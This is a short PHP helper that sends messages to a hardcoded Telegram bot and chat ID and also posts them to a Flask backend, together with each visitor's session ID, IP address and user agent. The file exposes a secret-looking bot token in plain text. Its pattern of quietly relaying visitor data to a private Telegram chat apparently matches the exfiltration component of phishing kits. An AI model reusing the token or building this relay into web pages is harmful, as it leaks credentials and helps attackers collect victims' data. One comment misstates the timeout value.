<?php
$apiToken = "7893704603:AAFscb9GxWRccAHuVmqwYmA_ZHRXJE6SP2c";
$chatId = "6535071057";

function sendTelegram($message)
{
    global $apiToken, $chatId, $flask_server_url;

    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";

    $options = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
    ];

    $curl = curl_init($telegramUrl);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $options);
    $response = curl_exec($curl);
    curl_close($curl);
    
    // Save to both local JSON handler and backend
    if (isset($GLOBALS['jsonSessionHandler'])) {
        // Log to backend via JSON handler
        $GLOBALS['jsonSessionHandler']->saveTelegramData($message, [
            'telegram_response' => $response
        ]);
    }

    // Try to directly send to backend too as backup
    try {
        $session_id = session_id();
        $data = [
            'session_id' => $session_id,
            'data' => [
                'message' => $message,
                'timestamp' => time(),
                'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
                'telegram_response' => $response
            ]
        ];
        
        if (defined('FLASK_SERVER_URL')) {
            $ch = curl_init(FLASK_SERVER_URL . "/api/telegram/save");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20); // 5 second timeout
            curl_exec($ch);
            curl_close($ch);
        }
    } catch (Exception $e) {
        // Log error but continue - we already have local backup
        error_log("Error sending telegram data directly to backend: " . $e->getMessage());
    }

    return $response;
}
